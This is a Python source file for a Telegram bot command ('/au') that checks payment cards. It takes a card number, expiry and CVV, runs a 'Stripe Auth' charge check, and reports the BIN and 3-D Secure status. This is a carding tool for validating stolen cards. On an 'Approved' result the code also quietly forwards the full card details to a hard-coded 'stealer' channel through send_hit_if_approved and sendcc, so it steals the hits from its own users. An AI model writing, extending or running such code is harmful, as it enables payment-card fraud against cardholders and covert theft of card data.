import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import *
from .gate import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Replace with your actual channel ID
STEALER_CHANNEL_ID = -1002549777556

@Client.on_message(filters.command("au", [".", "/"]))
async def stripe_auth_cmd(client: Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(client, message)
        gateway = "Stripe Auth"

        if checkall[0] is False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc is False:
            resp = f"""<b>
Gate Name: {gateway} ♻️
CMD: /au

Message: No CC Found in your input ❌

Usage: /au cc|mes|ano|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        firstresp = f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
</b>
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
"""
        await asyncio.sleep(0.5)
        await firstchk.edit_text(secondresp)

        start = time.perf_counter()
        session = httpx.AsyncClient(timeout=30, follow_redirects=True)

        sks = await getallsk()
        result = await create_cvv_charge(fullcc, session)
        getbin = await get_bin_details(cc)
        getresp = await get_charge_resp(result, user_id, fullcc)

        status = getresp["status"]
        response = getresp["response"]

        thirdresp = f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
"""
        await asyncio.sleep(0.5)
        await firstchk.edit_text(thirdresp)

        brand = getbin[0]
        type = getbin[1]
        level = getbin[2]
        bank = getbin[3]
        country = getbin[4]
        flag = getbin[5]
        currency = getbin[6]
        bin_code = cc[:6]

        # VBV BIN Check
        vbv_status = "Not Found"
        try:
            with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
                for line in file:
                    parts = line.strip().split('|')
                    if line.startswith(cc[:6]) and len(parts) > 1:
                        vbv_response = parts[1]
                        if "3D TRUE ❌" in vbv_response:
                            vbv_status = "3D TRUE ❌"
                        elif "3D PASSED ✅" in vbv_response:
                            vbv_status = "3D PASSED ✅"
                        break
                else:
                    vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
        except Exception:
            vbv_status = "VBV File Error"

        proxy_status = "Live ✨"

        finalresp = f"""
{status}
━━━━━━━━━━━━━━━
[ﾒ] Card ➺ <code>{fullcc}</code>
[ﾒ] Gateway ➺ <i>{gateway}</i>
[ﾒ] Response ➺ ⤿ {response} ⤾
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[ﾒ] Bin ➺ {bin_code}
[ﾒ] Info ➺ {brand} - {type} - {level}
[ﾒ] Bank ➺ {bank}
[ﾒ] Country ➺ {country} - {flag} - {currency}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[仝] VBV ➺ {vbv_status}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[ﾒ] Checked By ➺ <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
[ﾒ] Dev ➺ ⏤‌‌‌‌ <a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>
━━━━━━━━━━━━━━━
[ﾒ] T/t ➺ [{time.perf_counter() - start:0.2f} seconds] | P/x ➺ [{proxy_status}]
"""

        buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("Group", url="https://t.me/+W1ZVCjwjbvs5MTll"),
                    InlineKeyboardButton("Owner", url="https://t.me/spid_3r")
                ]
            ]
        )

        await asyncio.sleep(0.5)
        await firstchk.edit_text(finalresp, reply_markup=buttons)

        await setantispamtime(user_id)
        await deductcredit(user_id)

        if status == "Approved ✅":
            await send_hit_if_approved(client, finalresp)
            await sendcc(finalresp, session)

        await session.aclose()

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
                        
